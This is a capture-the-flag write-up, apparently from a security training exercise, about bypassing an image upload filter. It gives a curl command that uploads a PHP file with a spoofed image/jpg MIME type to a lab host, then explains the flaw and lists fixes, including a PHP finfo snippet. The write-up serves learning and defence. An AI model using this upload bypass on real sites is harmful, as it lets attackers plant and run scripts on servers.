# 09 - MIME Type Spoofing

## Reproduce

In the image upload page: `http://192.168.1.19/?page=upload`

The upload accept only the '.jpg', but MIME types also can not be misleading, so we:

- Create a php file that we want to inject:
  `touch xxx.php`
- Upload the php file and grep the flag:
  `curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@xxx.php;type=image/jpg' http://192.168.1.19/?page=upload | grep 'flag'`

Tadaa we got the flag

## Explanation of the vulnerability

Checking for mime type in php is pretty easy but the mime can be spoofed. The attacker can upload a php script with for example jpg mime type, this vurnability can give the hacker the chance to upload a bad php script to the machine and then execute it from the upload folder

## Fix

- First check the extension with a list of allowed ones ('jpg', ...)
- Check the uploaded file itself by running getimagesize on the file, it will return FALSE if it's not an image
- Check that the mime type of the file corresponds to the extension
- Avoid all redirects to uploaded images to avoid telling the folder where it is stored.

`function getRealMimeType($filename) { $finfo = new finfo(FILEINFO_MIME, "/usr/share/misc/magic"); if (!$finfo) { echo "Opening fileinfo database failed"; return ""; } return $finfo->file($filename); }`
